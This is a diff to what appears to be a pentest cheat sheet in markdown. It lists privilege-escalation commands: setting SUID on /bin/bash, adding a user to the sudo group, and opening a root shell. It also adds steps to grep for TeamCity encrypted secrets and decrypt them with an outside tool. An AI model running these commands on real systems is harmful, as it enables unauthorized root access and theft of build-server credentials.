@@ -28,12 +28,25 @@
 
 ## Commands to use:
 
- - chmod u+s /bin/bash
+ - 1) chmod u+s /bin/bash
  
- - usermod -aG sudo USER (Adds the user to sudo group)
+ - 2) usermod -aG sudo USER (Adds the user to sudo group)
 
 ### Then on our target machine if we have SSH access 
 
- - sudo -s (Gain root shell)
+ - 2) sudo -s (Gain root shell)
 
+# Teamcity server secrets decryption
+
+### All TeamCity encrypted secrets start with zxx.
+
+### TeamCity secrets are stored within the data directory.
+
+### Command to find secrets within data directory
+
+ - grep -R zxx
+
+### Then decrypt with the tool: https://github.com/0xE2/teamcity-unscrambler/
+
+ - python3 unscrambler.py TEAMCITY_SECRET
 
